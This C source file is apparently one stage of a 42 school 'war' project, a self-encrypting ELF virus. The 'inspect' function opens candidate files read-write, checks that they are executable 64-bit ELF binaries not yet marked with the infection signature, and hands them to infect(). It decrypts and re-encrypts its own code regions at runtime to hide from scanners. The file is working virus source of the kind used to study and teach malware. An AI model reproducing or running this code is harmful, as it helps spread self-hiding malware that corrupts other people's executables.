/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inspect.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/31 19:28:21 by ddinaut           #+#    #+#             */
/*   Updated: 2019/04/08 18:18:46 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

/*
  Inspect verify that found binary is a clean, executable, x86_64 binary
*/

void	inspect(t_data *data, char *path)
{

#ifdef DEBUG
	char de[] = "inspect\t0\n";
	data->context == true ?	de[8] = 49 : 0;
	_write(1, de, _strlen(de));
#endif

	revert_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
	if (data->context != true)
		goto next;

	struct stat st;

	data->context = false;
  	if ((data->bin.fd = _open(path, O_RDWR, 0000)) < 0)
		goto next;
	if (_fstat(data->bin.fd, &st) < 0)
		goto next;
	if (!(st.st_mode & S_IXUSR))
		goto next;
	if ((data->bin.map = _mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, data->bin.fd, 0)) == MAP_FAILED)
		goto next;

	data->bin.size = st.st_size;
	data->header = (Elf64_Ehdr*)data->bin.map;
	if ((*((unsigned char*)data->header + EI_MAG0) != ELFMAG0) || \
		(*((unsigned char*)data->header + EI_MAG1) != ELFMAG1) || \
		(*((unsigned char*)data->header + EI_MAG2) != ELFMAG2) || \
		(*((unsigned char*)data->header + EI_MAG3) != ELFMAG3) || \
		(*((unsigned char*)data->header + EI_CLASS) != ELFCLASS64) || \
		(*(uint32_t*)&data->header->e_ident[EI_PAD] == SIGNATURE))
	{
		_munmap(data->bin.map, st.st_size);
		goto next;
	}
	data->context = true;
	data->name = path;

#ifdef DEBUG
	_write(1, path, _strlen(path));
	_write(1, &de[9], 1);
#endif


next:
   	update_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	infect(data);
}
